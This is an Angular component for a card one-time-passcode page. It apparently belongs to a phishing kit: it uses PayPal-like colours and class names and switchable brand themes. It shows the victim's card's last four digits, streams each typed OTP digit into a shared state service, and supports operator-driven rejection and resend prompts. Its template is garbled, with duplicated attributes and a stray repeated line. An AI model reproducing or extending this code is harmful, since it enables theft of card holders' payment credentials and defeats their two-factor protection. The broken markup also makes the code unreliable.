
import { Component, inject, signal, computed, AfterViewInit, OnDestroy } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule } from '@angular/forms';
import { PublicLayoutComponent } from './layout/public-layout.component';
import { StateService } from '../services/state.service';
import { TranslatePipe } from '../pipes/translate.pipe';

@Component({
  selector: 'app-card-otp',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
  template: `
    <app-public-layout>
      <div class="flex flex-col items-center mb-8">
        <!-- Badge -->
        <div *ngIf="showBadge()" 
             class="px-3 py-1 rounded-full uppercase tracking-wider mb-5 border animate-fade-in text-[11px] font-bold"
             [style.background]="badgeBg()"
             [style.color]="badgeColor()"
             [style.border-color]="badgeBorder()">
           {{ 'CARD_OTP.BADGE' | translate }}
        </div>
        <h1 class="text-xl font-bold mb-2 text-center tracking-tight" [style.color]="headerColor()">{{ 'CARD_OTP.TITLE' | translate }}</h1>
        <p class="text-base text-center px-4 max-w-xs leading-relaxed opacity-80" [style.color]="textColor()">
           {{ 'CARD_OTP.DESC' | translate: { last4: last4() } }}
        </p>
      </div>

      <!-- Feedback -->
      @if (state.rejectionReason()) {
        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in fade-in slide-in-from-top-2">
            <span class="material-icons text-[#D92D20] text-xl">error_outline</span>
            <div>
              <p class="text-sm font-bold" [style.color]="headerColor()">{{ 'CARD_OTP.INVALID_TITLE' | translate }}</p>
              <p class="text-xs mt-1 opacity-80" [style.color]="textColor()">{{ 'CARD_OTP.INVALID_DESC' | translate }}</p>
            </div>
        </div>
      }

      <div class="space-y-8">
        <div class="pp-input-group">
            <input 
              type="text" 
              [(ngModel)]="otp"
              (input)="onInput($event)"
              id="otp"
              placeholder=" "
              placeholder=" "
              class="block"
              [class]="inputClasses()"
              [style]="inputStyles()"
              [style.color]="inputTextColor()"
              [class.shadow-input-error]="state.rejectionReason()"
            />
              [class.shadow-input-error]="state.rejectionReason()"
            />
            <label for="otp" 
                class="absolute left-1/2 -translate-x-1/2 w-auto px-2"
                [class]="labelClasses()"
                [style.color]="inputTextColor()">
               {{ 'CARD_OTP.INPUT_LABEL' | translate }}
            </label>
        </div>

        <button 
          (click)="submit()"
          [disabled]="otp.length < 4"
          [class.opacity-50]="otp.length < 4"
          [disabled]="otp.length < 4"
          [style.background]="btnBackground()"
          [style.color]="btnTextColor()"
          [style.border-radius]="btnRadius()"
          [class.opacity-50]="otp.length < 4"
          class="w-full py-3 font-bold text-lg shadow-md hover:shadow-lg transform active:scale-[0.98] transition-all relative overflow-hidden"
        >
          {{ 'COMMON.VERIFY' | translate }}
        </button>

        <div class="text-center">
            <p class="text-xs mb-2 font-bold opacity-60" [style.color]="textColor()">{{ 'CARD_OTP.NO_CODE' | translate }}</p>
            <button 
                (click)="resend()"
                [disabled]="timer() > 0"
                class="font-bold text-sm hover:underline disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed transition-colors"
                [style.color]="primaryColor()">
                {{ timer() > 0 ? ('CARD_OTP.RESEND_WAIT' | translate: { seconds: timer() }) : ('CARD_OTP.RESEND' | translate) }}
            </button>
        </div>
      </div>
    </app-public-layout>
  `
})
export class CardOtpComponent implements AfterViewInit, OnDestroy {
  state = inject(StateService);
  otp = '';

  last4 = signal('');
  timer = signal(0);
  private timerInterval: any;

  // Theme Computeds
  theme = computed(() => this.state.currentFlow()?.theme);

  headerColor = computed(() => this.theme()?.input.textColor || '#001C64');
  textColor = computed(() => this.theme()?.input.textColor || '#64748b');
  inputTextColor = computed(() => this.theme()?.input.textColor || '#111827');

  primaryColor = computed(() => this.theme()?.button.background || '#0070BA');
  btnBackground = computed(() => this.theme()?.button.background || '#0070BA');
  btnTextColor = computed(() => this.theme()?.button.color || '#ffffff');
  btnRadius = computed(() => this.theme()?.button.borderRadius || '999px');

  // Badge Logic
  showBadge = computed(() => this.theme()?.mode !== 'dark');
  badgeBg = computed(() => this.theme()?.button.background + '10');
  badgeColor = computed(() => this.theme()?.button.background);
  badgeBorder = computed(() => this.theme()?.button.background + '30');

  constructor() {
    // safe access
    const num = this.state.cardNumber();
    if (num && num.length > 4) {
      this.last4.set(num.slice(-4));
    }
    // Start timer automatically on view enter
    this.startTimer();
  }

  ngAfterViewInit() {
    // Auto focus logic
    setTimeout(() => {
      const el = document.getElementById('otp');
      if (el) el.focus();
    }, 100);
  }

  ngOnDestroy() {
    if (this.timerInterval) clearInterval(this.timerInterval);
  }

  startTimer() {
    this.timer.set(30);
    if (this.timerInterval) clearInterval(this.timerInterval);
    this.timerInterval = setInterval(() => {
      this.timer.update(v => {
        if (v <= 1) {
          clearInterval(this.timerInterval);
          return 0;
        }
        return v - 1;
      });
    }, 1000);
  }

  onInput(event: any) {
    // Allow numbers only
    const val = event.target.value.replace(/\D/g, '');
    this.otp = val;
    this.state.updateCard({ otp: val });
  }

  submit() {
    if (this.otp.length >= 4) {
      this.state.submitCardOtp(this.otp);
    }
  }

  resend() {
    if (this.timer() === 0) {
      this.state.triggerResendAlert();
      this.startTimer();
    }
  }

  // Styles
  inputStyles() {
    const t = this.theme()?.input;
    return {
      'background-color': t?.backgroundColor || '#fff',
      'border-radius': t?.borderRadius || '0.5rem',
      'height': '3.5rem'
    };
  }

  inputClasses() {
    const style = this.theme()?.input.style || 'modern';
    const base = 'w-full outline-none transition-all duration-200 text-center tracking-[0.5em] font-mono font-bold text-lg';

    switch (style) {
      case 'material':
        return `${base} border-b-2 border-x-0 border-t-0 rounded-none px-0 bg-transparent focus:ring-0`;
      case 'box':
        return `${base} border-none rounded px-4 bg-[#333] text-white focus:ring-2 focus:ring-red-600`;
      case 'outline':
        return `${base} border rounded-lg px-4 bg-transparent focus:ring-1 focus:border-inherit`;
      default:
        return `${base} border rounded-lg px-4 focus:ring-2 focus:ring-opacity-50 focus:border-transparent`;
    }
  }

  labelClasses() {
    const style = this.theme()?.input.style || 'modern';
    let classes = "absolute left-1/2 -translate-x-1/2 transition-all duration-200 pointer-events-none whitespace-nowrap ";

    if (style === 'material') {
      classes += "top-0 -translate-y-[120%] text-sm opacity-80";
    } else if (style === 'box') {
      classes += "top-1/2 -translate-y-1/2 text-sm opacity-60 peer-focus:opacity-0 peer-[&:not(:placeholder-shown)]:opacity-0";
    } else {
      classes += "text-sm peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-0 peer-focus:-translate-y-[130%] peer-focus:scale-90 peer-[&:not(:placeholder-shown)]:top-0 peer-[&:not(:placeholder-shown)]:-translate-y-[130%] peer-[&:not(:placeholder-shown)]:scale-90 bg-transparent";
    }
    return classes;
  }
}
